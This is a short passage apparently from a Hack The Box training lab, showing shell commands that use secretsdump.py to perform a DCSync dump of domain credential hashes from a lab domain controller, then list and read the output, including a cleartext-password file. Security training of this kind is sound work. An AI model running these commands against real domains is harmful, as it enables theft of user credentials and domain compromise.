...
```shell-session
canklesmaks@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
...
```shell-session
canklesmaks@htb[/htb]$ ls inlanefreight_hashes*
...
```shell-session
canklesmaks@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
